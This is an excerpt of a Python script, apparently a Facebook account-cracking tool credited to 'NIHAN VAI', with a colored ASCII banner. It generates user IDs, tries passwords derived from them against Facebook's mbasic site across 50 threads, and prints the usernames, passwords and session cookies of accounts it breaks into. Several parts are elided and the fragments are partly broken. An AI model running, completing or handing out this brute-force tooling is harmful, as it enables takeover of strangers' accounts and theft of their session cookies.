...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/PICCiNihan410/')
logo =("""\033[0;92m
  ##    ## #### ##     ##    ###    ##    ## 
###   ##  ##  ##     ##   ## ##   ###   ## 
####  ##  ##  ##     ##  ##   ##  ####  ## 
...
##    ## #### ##     ## ##     ## ##    ## 
 ...
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mNIHAN VAI   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m NIHAN VAI               \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mNIHAN VAU               \033[1;93m|
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m NIHAN VAI')
        jalan(' \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=Ru1xZB57TXOCtbJN7Dc3j1Cb; sb=Ru1xZCMmBkwZ-bEK1EzxDDcy',
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45mNIHAN-OK💉\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}NIHAN{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
